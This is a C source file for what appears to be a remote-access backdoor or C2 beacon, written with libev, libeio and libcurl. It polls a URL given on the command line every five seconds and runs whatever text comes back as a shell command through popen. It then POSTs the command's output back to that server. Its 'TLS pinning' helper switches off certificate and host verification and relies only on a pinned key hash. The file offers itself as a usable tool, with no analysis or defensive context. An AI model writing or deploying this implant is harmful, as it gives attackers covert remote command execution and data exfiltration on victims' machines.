/*
 * MIT License
 *
 * Copyright (c) 2025 Ivan Nikolskiy
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include <curl/curl.h>
#include <ev.h>
#include <eio.h>

#define MAX_BUFFER 1024
#define CORE_EV_FLAGS EVFLAG_NOENV | EVBACKEND_SELECT | EVFLAG_FORKCHECK
#define PINNED_PUBKEY "sha256//s+04mFRP667n3f2fpMhj3umDuEvIP3AFASoMhH0SYJM=" // pinned TLS public key hash

static struct ev_idle eio_idle_watcher;
static struct ev_async eio_async_watcher;

struct async_handle_data
{
    char url[MAX_BUFFER];
    char command[MAX_BUFFER];
};

static void eio_idle_cb(struct ev_loop *loop, struct ev_idle *w, int revents)
{
    (void)revents;
    if (eio_poll() != -1)
    {
        ev_idle_stop(loop, w);
    }
}

static void eio_async_cb(struct ev_loop *loop, struct ev_async *w, int revents)
{
    (void)revents;

    if (eio_poll() == -1)
    {
        ev_idle_start(loop, &eio_idle_watcher);
    }

    ev_async_start(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_want_poll(void)
{
    ev_async_send(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_done_poll(void)
{
    ev_async_stop(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void core_signal_handler(struct ev_loop *loop, ev_signal *w, int revents)
{
    (void)revents;

    switch (w->signum)
    {
        case SIGINT:
            printf("* Core has SIGINT caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        case SIGTERM:
            printf("* Core has SIGTERM caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        default:
            break;
    }
}

/* Apply TLS verification + pinning to a CURL handle */
static void apply_tls_pinning(CURL *curl)
{
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    /* Public key pinning (SPKI) */
    curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, PINNED_PUBKEY);

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
}

// Function to write the response data from GET request
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data)
{
    size_t total;

    total = size * nmemb;

    if (total < MAX_BUFFER)
    {
        memcpy(data, ptr, total);
        data[total] = '\0'; // Null terminate the string
    }

    return total;
}

// Function to send the POST request
void send_post_request(const char *url, const char *data)
{
    CURL *curl;
    CURLcode status;
    struct curl_slist *headers = NULL;

    curl = curl_easy_init();

    if (curl)
    {
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        /* TLS pinning on POST */
        apply_tls_pinning(curl);

        status = curl_easy_perform(curl);

        if (status != CURLE_OK)
        {
            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(status));
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}

// Function to execute a command asynchronously
static void send_command(eio_req *request)
{
    struct async_handle_data *data;
    char output[MAX_BUFFER + 1];
    FILE *fp;
    size_t bytes_read;

    data = request->data;
    fp = popen(data->command, "r");

    if (fp == NULL)
    {
        perror("popen failed");
        return;
    }

    memset(output, '\0', sizeof(output));

    while ((bytes_read = fread(output, 1, MAX_BUFFER, fp)) > 0)
    {
        send_post_request(data->url, output);
        memset(output, '\0', sizeof(output));
    }

    pclose(fp);
}

// Callback for libev loop
static void async_command_cb(EV_P_ ev_timer *w, int revents)
{
    (void)revents;

    CURL *curl;
    CURLcode status;

    struct async_handle_data *data;
    data = w->data;

    curl = curl_easy_init();
    if (!curl)
    {
        fprintf(stderr, "Failed to initialize CURL\n");
        return;
    }

    memset(data->command, '\0', sizeof(data->command));

    curl_easy_setopt(curl, CURLOPT_URL, data->url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, data->command);

    /* TLS pinning on GET */
    apply_tls_pinning(curl);

    status = curl_easy_perform(curl);
    if (status != CURLE_OK)
    {
        fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(status));
        curl_easy_cleanup(curl);
        return;
    }

    curl_easy_cleanup(curl);

    /* mirror asynchronously (eio stays) */
    eio_custom(send_command, 0, NULL, data);
}

int main(int argc, char *argv[])
{
    ev_timer timer;
    ev_signal sigint_watcher;
    ev_signal sigterm_watcher;

    struct ev_loop *loop;
    struct async_handle_data *data;

    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s <URL>\n", argv[0]);
        return 1;
    }

    if (strncmp(argv[1], "https://", 8) != 0)
    {
        fprintf(stderr, "Error: URL must start with https:// for TLS pinning\n");
        return 1;
    }

    if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0)
    {
        fprintf(stderr, "curl_global_init failed\n");
        return 1;
    }

    data = calloc(1, sizeof(*data));
    if (data == NULL)
    {
        fprintf(stderr, "Failed to allocate space for data\n");
        curl_global_cleanup();
        return 1;
    }

    loop = ev_default_loop(CORE_EV_FLAGS);

    ev_idle_init(&eio_idle_watcher, eio_idle_cb);
    ev_async_init(&eio_async_watcher, eio_async_cb);
    eio_init(eio_want_poll, eio_done_poll);

    /* signal handling (your handler already exists) */
    ev_signal_init(&sigint_watcher, core_signal_handler, SIGINT);
    ev_signal_init(&sigterm_watcher, core_signal_handler, SIGTERM);
    ev_signal_start(loop, &sigint_watcher);
    ev_signal_start(loop, &sigterm_watcher);

    ev_timer_init(&timer, async_command_cb, 0., 5.); // Poll every 5 seconds
    strncpy(data->url, argv[1], sizeof(data->url) - 1);

    timer.data = data;
    ev_timer_start(loop, &timer);

    ev_run(loop, 0);

    free(data);
    curl_global_cleanup();

    return 0;
}
